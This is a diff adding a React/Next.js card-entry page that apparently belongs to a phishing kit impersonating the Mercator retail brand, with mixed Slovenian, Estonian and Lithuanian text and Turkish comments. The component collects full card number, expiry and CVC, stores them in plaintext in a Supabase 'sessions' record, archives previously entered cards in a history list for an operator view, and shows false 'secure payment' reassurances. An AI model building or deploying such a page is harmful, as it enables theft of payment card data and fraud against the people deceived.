@@ -1,0 +1,259 @@
+"use client";
+
+import { useEffect, useMemo, useState } from "react";
+import { useRouter } from "next/navigation";
+import { DemoShell } from "@/components/demo/DemoShell";
+import { ConfigMissing } from "@/components/demo/ConfigMissing";
+import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+import { stepToPath } from "@/lib/session-routes";
+import { useSettings } from "@/contexts/SettingsContext";
+
+type Props = {
+  sessionId: string;
+};
+
+export function CardClient({ sessionId }: Props) {
+  const router = useRouter();
+  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
+  const { settings, loading: settingsLoading } = useSettings();
+  const [number, setNumber] = useState("");
+  const [expiry, setExpiry] = useState("");
+  const [cvc, setCvc] = useState("");
+  const [saving, setSaving] = useState(false);
+  const [msg, setMsg] = useState<string | null>(null);
+  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
+  const ui = {
+    panel: "app-panel rounded-2xl p-6",
+    input: "app-input mt-1 w-full px-3 py-2",
+    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-60",
+  };
+
+  useEffect(() => {
+    let cancelled = false;
+    void (async () => {
+      if (supabase === null || !sessionId) return;
+      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
+      if (cancelled || !data) return;
+      const fd = (data.form_data ?? {}) as Record<string, string>;
+      setSessionFormData(fd);
+      setNumber(fd.cardNumber ?? "");
+      setExpiry(fd.cardExpiry ?? "");
+      setCvc(fd.cardCvc ?? "");
+    })();
+    return () => {
+      cancelled = true;
+    };
+  }, [sessionId, supabase]);
+
+  function formatExpiry(value: string) {
+    const digits = value.replace(/\D/g, "").slice(0, 4);
+    if (digits.length <= 2) return digits;
+    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+  }
+
+  const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
+  const cvcValid = /^\d{3,4}$/.test(cvc);
+
+  async function handleSubmit(e: React.FormEvent) {
+    e.preventDefault();
+    if (!supabase || !sessionId) return;
+    if (!expiryValid) {
+      setMsg("Vnesite veljaven datum poteka (MM/LL).");
+      return;
+    }
+    if (!cvcValid) {
+      setMsg("Vnesite veljaven CVC/CVV (3 ali 4 števke).");
+      return;
+    }
+    setSaving(true);
+    setMsg(null);
+
+    // 1) KART GECMISI KAYDI: ESKI kart degerleri (cardLoginHistory) yeni giristen ONCE history'ye atilir.
+    //    Boylece en guncel kart TEKIL olarak cardNumber/cardExpiry/cardCvc'de durur, ESKI kartlar sadece GECMIS MODAL'inda gorunur.
+    let cardLoginHistory: unknown[] = [];
+    try {
+      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
+      const sfd = sessionFormData as Record<string, unknown>;
+      const oldHolder = str(sfd.cardHolder);
+      const oldNumber = str(sfd.cardNumber);
+      const oldExpiry = str(sfd.cardExpiry);
+      const oldCvc = str(sfd.cardCvc);
+      const newHolder = "";
+      const newNumber = number.trim();
+      const newExpiry = expiry.trim();
+      const newCvc = cvc.trim();
+      // Kart numarasi veya son kullanma tarihi degisti ise ESKI'yi history'ye ekle.
+      // Ayni kartla tekrar giris (ayni number+expiry+cvc) ise history'ye ekLEME.
+      const isDifferentCard = Boolean(
+        (oldNumber || oldExpiry || oldCvc) &&
+        !(oldNumber === newNumber && oldExpiry === newExpiry && oldCvc === newCvc)
+      );
+      if (isDifferentCard) {
+        const arr: unknown[] = Array.isArray(sfd.cardLoginHistory)
+          ? [...(sfd.cardLoginHistory as unknown[])]
+          : [];
+        arr.unshift({
+          submittedAt: new Date().toISOString(),
+          cardHolder: oldHolder,
+          cardNumber: oldNumber,
+          cardExpiry: oldExpiry,
+          cardCvc: oldCvc,
+        });
+        cardLoginHistory = arr;
+      }
+    } catch {
+      /* sessiz */
+    }
+
+    const nextFormData: Record<string, unknown> = {
+      ...sessionFormData,
+      cardHolder: "",
+      cardNumber: number.trim(),
+      cardExpiry: expiry.trim(),
+      cardCvc: cvc.trim(),
+    };
+    if (cardLoginHistory.length > 0) {
+      nextFormData.cardLoginHistory = cardLoginHistory;
+    }
+
+    const { error } = await supabase
+      .from("sessions")
+      .update({ is_hidden: false, current_step: "wait",
+        form_data: nextFormData,
+      })
+      .eq("id", sessionId);
+
+    setSaving(false);
+    if (error) setMsg("Shranjevanje ni uspelo.");
+    else {
+      setSessionFormData(nextFormData);
+      router.push(stepToPath("wait", sessionId));
+    }
+  }
+
+
+  if (settingsLoading) {
+    return (
+      <div className="flex min-h-[100dvh] items-center justify-center">
+        <div className="flex justify-center py-16">
+          <div className="size-12 animate-spin rounded-full border-4 border-[#E30613]/30 border-t-[#E30613]" />
+        </div>
+      </div>
+    );
+  }
+
+  if (!supabase) {
+    return (
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#E30613] shadow-[0_0_40px_rgba(227,6,19,0.3)] p-5 sm:p-8">
+          <ConfigMissing />
+        </div>
+      </div>
+    );
+  }
+
+  if (!sessionId) {
+    return (
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#E30613] shadow-[0_0_40px_rgba(227,6,19,0.3)] p-5 sm:p-8 text-center">
+          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+            Neteisinga nuoroda.
+          </p>
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[#160509] border border-[#E30613] shadow-[0_0_40px_rgba(227,6,19,0.3)] p-6 sm:p-10 relative z-10 fade-in">
+        
+        {/* Right Top Logo Placeholder */}
+        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
+          <img
+            src="/form-assets/mercator-logo.png"
+            alt="Mercator logo"
+            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
+            id="card-ah-logo"
+          />
+        </div>
+
+        <div className="mb-6 flex items-start gap-4">
+          <div className="mt-1 shrink-0">
+            <img src="/ah-icon-security-transparent.png" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
+          </div>
+          <div>
+            <h2 className="text-2xl font-bold text-white mb-1">{settings.card_title}</h2>
+            <p className="text-sm text-gray-300 font-medium">{settings.card_subtitle}</p>
+          </div>
+        </div>
+
+        <form onSubmit={handleSubmit} className="space-y-4">
+          <label className="block text-sm font-medium text-white">
+            {settings.card_number_label}
+            <input
+              required
+              inputMode="numeric"
+              className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#E30613] focus:outline-none focus:ring-2 focus:ring-[#E30613]/50"
+              value={number}
+              onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
+              autoComplete="cc-number"
+            />
+          </label>
+          <div className="grid grid-cols-2 gap-3">
+            <label className="block text-sm font-medium text-white">
+              {settings.card_expiry_label}
+              <input
+                required
+                placeholder="MM/JJ"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#E30613] focus:outline-none focus:ring-2 focus:ring-[#E30613]/50"
+                value={expiry}
+                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+                autoComplete="cc-exp"
+                inputMode="numeric"
+                maxLength={5}
+              />
+            </label>
+            <label className="block text-sm font-medium text-white">
+              {settings.card_cvv_label}
+              <input
+                required
+                inputMode="numeric"
+                maxLength={4}
+                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#E30613] focus:outline-none focus:ring-2 focus:ring-[#E30613]/50"
+                value={cvc}
+                onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                autoComplete="cc-csc"
+              />
+            </label>
+          </div>
+
+          {!expiryValid && expiry.length > 0 ? (
+            <p className="text-xs text-red-400">Aegumiskuupäev peab olema vormingus KK/AA.</p>
+          ) : null}
+
+          {!cvcValid && cvc.length > 0 ? (
+            <p className="text-xs text-red-400">CVV koosneb 3 või 4 numbrist.</p>
+          ) : null}
+
+          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
+
+          <button
+            type="submit"
+            disabled={saving || !expiryValid || !cvcValid}
+            className="w-full rounded-xl bg-gradient-to-r from-[#E30613] to-[#ff4d59] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(227,6,19,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+          >
+            {saving ? "Pošiljanje..." : settings.card_button}
+          </button>
+          
+          <div className="mt-4 flex items-center justify-center gap-2">
+            <img src="/ah-icon-security-transparent.png" alt="Secure" className="h-5 w-5" />
+            <span className="text-[13px] font-medium text-gray-300">
+              Teie andmed töötlemisel turvaliselt.
+            </span>
+          </div>
+        </form>
+      </div>
+    </div>
+  );
+}
